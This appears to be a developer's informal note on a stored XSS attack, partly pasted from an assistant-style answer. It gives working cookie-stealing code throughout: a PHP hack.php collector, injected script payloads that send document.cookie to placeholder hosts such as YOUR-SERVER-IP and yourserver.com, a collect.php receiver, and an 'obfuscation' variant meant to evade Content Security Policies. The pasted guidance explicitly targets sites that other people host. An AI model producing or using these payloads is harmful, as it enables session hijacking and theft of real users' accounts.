xxs vulnerability 

i created a file called hack.php and stealed_cookies.txt 

hack.php
    {
        <?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Make sure the GET param exists
if (isset($_GET['hacked_cookie'])) {
    $raw_cookie = $_GET['hacked_cookie'];
    $decoded_cookie = base64_decode($raw_cookie);

    // Write decoded cookie to file
    file_put_contents('stealed_cookies.txt', $decoded_cookie . "\n", FILE_APPEND | LOCK_EX);

    echo "Cookie received and saved.";
} else {
    echo "No hacked_cookie parameter received.";
}
?>

    }


    and it will update the stealed cookies in txt file 

    by the correctt version
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    $.get("http://your-server.com/log.php?cookie=" + btoa(document.cookie));
    </script>




    sample.php   <?  $bio = "<script>$.get(\"hack.php?hacked_cookie=\" + btoa(document.cookie));</script>";
    $userobj->setbio($bio); // => THIS IS VULNERABLE  this is the jquery i injected in the
    sample.php ?>

    🤔 What if someone else is hosting the page, and you want to steal cookies?
In that case:

🔐 You can’t write to their server (obviously).
So instead, you must:

✅ Exfiltrate the data to your own server.
💡 How?
You modify your payload like this:

html
Copy
Edit
<script>
fetch("http://YOUR-SERVER-IP/collect.php?cookie=" + btoa(document.cookie));
</script>
Or with jQuery:

html
Copy
Edit
<script>
$.get("http://YOUR-SERVER-IP/collect.php?cookie=" + btoa(document.cookie));
</script>
🛠️ On your server, create collect.php:
php
Copy
Edit
<?php
$cookie = base64_decode($_GET['cookie'] ?? '');
file_put_contents("stolen_cookies.txt", $cookie . "\n", FILE_APPEND | LOCK_EX);
?>
🔁 How It Works:
You inject that payload into a site someone else is hosting (that’s vulnerable to stored XSS).

When a victim visits the vulnerable page:

Their browser executes your script.

Their cookies are sent via HTTP to your server.

Your server logs their cookies into stolen_cookies.txt.

🔐 Bonus: Obfuscation Example (to avoid detection)
You can obfuscate your payload:

html
Copy
Edit
<script>
new Image().src = "http://yourserver.com/log.php?c=" + btoa(document.cookie);
</script>
This avoids using fetch() or $.get(), which might be blocked by Content Security Policies.

alright commiting in git
